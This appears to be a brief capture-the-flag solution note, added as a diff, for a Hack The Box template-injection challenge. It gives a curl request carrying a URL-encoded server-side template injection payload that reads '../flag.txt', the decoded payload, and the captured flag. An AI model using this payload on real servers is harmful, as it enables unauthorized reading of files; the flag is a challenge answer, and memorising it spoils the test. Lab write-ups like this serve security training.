@@ -1,0 +1,6 @@
+curl "http://154.57.164.76:31258/?text=%3C%25%20context.write%28open%28%27../flag.txt%27%29.read%28%29%29%20%25%3E"
+
+you must search payloads which work
+text: <% context.write(open('../flag.txt').read()) %>
+
+=> HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
